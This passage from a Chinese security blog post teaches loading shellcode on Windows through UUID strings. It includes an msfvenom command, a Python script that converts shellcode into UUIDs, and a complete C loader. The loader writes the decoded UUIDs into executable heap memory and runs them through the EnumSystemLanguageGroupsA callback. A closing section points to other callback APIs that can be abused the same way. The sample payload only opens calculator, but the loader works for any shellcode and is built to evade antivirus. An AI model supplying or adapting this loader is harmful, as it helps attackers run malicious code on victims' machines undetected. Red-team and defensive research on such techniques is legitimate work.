+</span></span><span style=display:flex><span>  UUID <span style=color:#f92672>*</span>Uuid
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>功能：创建UUID结构。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>UuidEqual</span>(
+</span></span><span style=display:flex><span>  UUID       <span style=color:#f92672>*</span>Uuid1,
+</span></span><span style=display:flex><span>  UUID       <span style=color:#f92672>*</span>Uuid2,
+</span></span><span style=display:flex><span>  RPC_STATUS <span style=color:#f92672>*</span>Status
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>功能：判断两个UUID是否相等。</p><p>通过URL查看：https://docs.microsoft.com/en-us/windows/win32/rpc/rpcdce/ns-rpcdce-uuid</p><p>UUID 代表了 -> <code>typedef GUID UUID;</code></p><h2 id=0x03-uuid-测试>0x03 UUID 测试</h2><h3 id=生成shellcode>生成Shellcode</h3><pre tabindex=0><code>./msfvenom -p windows/exec CMD=calc.exe -b &#39;\xfc\xe8&#39; -f raw -o /tmp/shellcode.bin
+</code></pre><h3 id=bin2uuid>Bin2UUID</h3><p>生成脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> uuid <span style=color:#f92672>import</span> UUID
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  ____  _    _______    _    _ _    _ _____ _____       
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> |  _ &lt;| | &#39;_ \| |/ _ \| |  | | |  | | | | | |  | / __| 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/
+</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;&#34;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;rb&#34;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    bin <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>and</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;--print&#34;</span>:
+</span></span><span style=display:flex><span>    outputMapping <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>    outputMapping <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Length of shellcode: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> bytes</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(len(bin)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>out <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(offset <span style=color:#f92672>&lt;</span> len(bin)):
+</span></span><span style=display:flex><span>    countOfBytesToConvert <span style=color:#f92672>=</span> len(bin[offset:])
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> countOfBytesToConvert <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>16</span>:
+</span></span><span style=display:flex><span>        ZerosToAdd <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> countOfBytesToConvert
+</span></span><span style=display:flex><span>        byteString <span style=color:#f92672>=</span> bin[offset:] <span style=color:#f92672>+</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span> ZerosToAdd)
+</span></span><span style=display:flex><span>        uuid <span style=color:#f92672>=</span> UUID(bytes_le<span style=color:#f92672>=</span>byteString)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        byteString <span style=color:#f92672>=</span> bin[offset:offset<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>]
+</span></span><span style=display:flex><span>        uuid <span style=color:#f92672>=</span> UUID(bytes_le<span style=color:#f92672>=</span>byteString)
+</span></span><span style=display:flex><span>    offset<span style=color:#f92672>+=</span><span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    out <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>{}</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>,</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(uuid)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> outputMapping:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74> -&gt; </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(byteString, uuid))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;UUIDs&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>write(out)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Outputted to: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;UUIDs&#34;</span>))
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae1d7ed2-4f5f-11ec-be52-00d861bf4abb.png alt=2021-02-08-20-41-08></p></p><h3 id=生成测试样本>生成测试样本</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;rpc.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment(lib,&#34;Rpcrt4.lib&#34;)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> buf[] <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;4baf01bd-dbdd-d9de-7424-f45a33c9b131&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;83136a31-04c2-6a03-0e4d-be21f81341da&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;3fcb73f8-b3c9-34af-7904-bb1975efe989&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;bd259d0e-28a7-f010-3800-6093ba5bb573&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;72c89383-cec4-2621-9d85-94d7aad02453&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;802cf5e0-f4b0-171d-cbae-bd9918dbf781&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;394ee67d-9cb5-eb50-845d-fed229acfe13&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;3327227b-f020-6246-8c57-76746f07d2fe&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;bad08a62-64c7-e79b-61ed-4272307075a8&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;59f68d76-6a06-2be6-0336-a0c0792745e7&#34;</span>,
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;844c482e-dab1-650c-545b-b67900000000&#34;</span>
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[]) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> dwNum <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(buf) <span style=color:#f92672>/</span> <span style=color:#66d9ef>sizeof</span>(buf[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	HANDLE hMemory <span style=color:#f92672>=</span> HeapCreate(HEAP_CREATE_ENABLE_EXECUTE <span style=color:#f92672>|</span> HEAP_ZERO_MEMORY, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (hMemory <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	PVOID pMemory <span style=color:#f92672>=</span> HeapAlloc(hMemory, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1024</span>);
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	DWORD_PTR CodePtr <span style=color:#f92672>=</span> (DWORD_PTR)pMemory;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (size_t i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> dwNum; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (CodePtr <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		RPC_STATUS	status <span style=color:#f92672>=</span> UuidFromStringA(RPC_CSTR(buf[i]), (UUID<span style=color:#f92672>*</span>)CodePtr);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (status <span style=color:#f92672>!=</span> RPC_S_OK) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		CodePtr <span style=color:#f92672>+=</span> <span style=color:#ae81ff>16</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (pMemory <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL) <span style=color:#f92672>==</span> FALSE) {
+</span></span><span style=display:flex><span>		<span style=color:#75715e>// 加载成功
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae5cbe3a-4f5f-11ec-b376-00d861bf4abb.png alt=2021-02-08-20-52-53></p></p><h2 id=0x04-windows-call-back函数>0x04 Windows CALL BACK函数</h2><p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p><p>通过MSDN直接搜索Callback/Proc关键字就能发现一些回调函数：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ae914808-4f5f-11ec-bce4-00d861bf4abb.png alt=2021-02-08-20-59-11></p></p><p>例如：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>
+</span></span><span style=display:flex><span>HINTERNET hOpen;                       <span style=color:#75715e>// Root HINTERNET handle
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>INTERNET_STATUS_CALLBACK iscCallback;  <span style=color:#75715e>// Holds the callback function
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Create the root HINTERNET handle.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>hOpen <span style=color:#f92672>=</span> InternetOpen( TEXT(<span style=color:#e6db74>&#34;Test Application&#34;</span>),
+</span></span><span style=display:flex><span>                      INTERNET_OPEN_TYPE_PRECONFIG,
+</span></span><span style=display:flex><span>                      NULL, NULL, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Set the status callback function.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>iscCallback <span style=color:#f92672>=</span> InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> CALLBACK <span style=color:#a6e22e>CallMaster</span>( HINTERNET,
+</span></span><span style=display:flex><span>    DWORD_PTR,
+</span></span><span style=display:flex><span>    DWORD,
+</span></span><span style=display:flex><span>    LPVOID,
+</span></span><span style=display:flex><span>    DWORD
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p><p>这篇文章中介绍了如何发现其他带有回调的<a href=http://ropgadget.com/posts/abusing_win_functions.html>Windows API</a>。</p><h2 id=参考>参考</h2><ul><li><a href=http://www.cn0sec.cn/index.php/archives/337/>http://www.cn0sec.cn/index.php/archives/337/</a></li><li><a href=http://ropgadget.com/posts/abusing_win_functions.html>http://ropgadget.com/posts/abusing_win_functions.html</a></li></ul></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
+<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
